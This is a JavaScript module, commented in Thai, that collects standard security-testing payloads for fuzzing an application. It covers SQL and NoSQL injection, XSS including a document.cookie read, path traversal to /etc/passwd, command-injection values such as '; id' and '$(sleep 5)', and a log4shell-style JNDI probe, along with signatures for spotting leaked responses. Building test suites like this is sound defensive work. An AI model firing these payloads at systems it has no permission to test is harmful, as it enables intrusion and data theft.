// ============================================================================
// payloads.js — ชุด payload สำหรับทดสอบความปลอดภัย (OWASP) และ fuzzing
// ----------------------------------------------------------------------------
// เป็น payload "ตรวจจับ" มาตรฐาน ใช้เพื่อดูว่าระบบ "กรอง/ป้องกัน" ได้หรือไม่
// ไม่ใช่ payload ทำลายข้อมูล — เหมาะกับการทดสอบระบบของตัวเองเพื่อออกรายงาน
// ============================================================================

// SQL Injection — ดูว่าระบบ reject/escape ได้ไหม (ไม่ได้ตั้งใจลบข้อมูล)
export const SQLI = [
  "' OR '1'='1",
  "' OR '1'='1' --",
  "admin'--",
  "1 UNION SELECT NULL--",
  "'; WAITFOR DELAY '0:0:5'--", // time-based probe
];

// Cross-Site Scripting — ดูว่า output ถูก encode หรือไม่
export const XSS = [
  '<script>alert(1)</script>',
  '"><img src=x onerror=alert(1)>',
  "javascript:alert(document.cookie)",
  '<svg/onload=alert(1)>',
];

// Path Traversal — ดูว่าเข้าถึงไฟล์นอกขอบเขตได้ไหม
export const PATH_TRAVERSAL = [
  '../../../../etc/passwd',
  '..%2f..%2f..%2fetc%2fpasswd',
  '....//....//etc/passwd',
];

// Command Injection — ดูว่าระบบรันคำสั่ง OS จาก input ไหม
export const CMD_INJECTION = [
  '; id',
  '| whoami',
  '`sleep 5`',
  '$(sleep 5)',
];

// NoSQL / operator injection
export const NOSQLI = [
  '{"$gt": ""}',
  '{"$ne": null}',
  '{"username": {"$ne": null}, "password": {"$ne": null}}',
];

// ค่าขอบเขต/ผิดรูปแบบ สำหรับ fuzzing ความทนทานของ validation
export const FUZZ_VALUES = [
  '',                         // ว่าง
  ' ',                        // ช่องว่าง
  'A'.repeat(10000),          // string ยาวมาก
  '%00',                      // null byte
  '🔥💀🧨',                    // unicode/emoji
  -2147483648,                // int ต่ำสุด
  2147483647,                 // int สูงสุด
  1.7976931348623157e308,     // float ใหญ่มาก
  null,
  true,
  [],
  {},
  '{{7*7}}',                  // template injection probe
  '${jndi:ldap://example.com/a}', // log4shell-style probe (ชี้ไป example.com เท่านั้น)
];

// รวมทุกกลุ่ม security เป็น label -> รายการ เพื่อวนทดสอบและรายงานแยกหมวด
export const SECURITY_SUITES = {
  'SQL Injection': SQLI,
  'XSS': XSS,
  'Path Traversal': PATH_TRAVERSAL,
  'Command Injection': CMD_INJECTION,
  'NoSQL Injection': NOSQLI,
};

// สัญญาณบ่งชี้ว่า "อาจมีช่องโหว่" ในเนื้อหา response (ใช้ประกอบการตัดสิน ไม่ใช่คำตัดสินสุดท้าย)
export const LEAK_SIGNATURES = [
  'root:x:0:0',               // /etc/passwd รั่ว
  'SQL syntax',               // error ของ SQL โผล่
  'ORA-',                     // Oracle error
  'SQLSTATE',                 // generic SQL error
  'Warning: mysql',           // PHP mysql warning
  'Microsoft OLE DB',         // MSSQL error
  'uid=',                     // ผลของ command injection (id)
  '49',                       // ผลของ {{7*7}} (ดูประกอบ context)
];
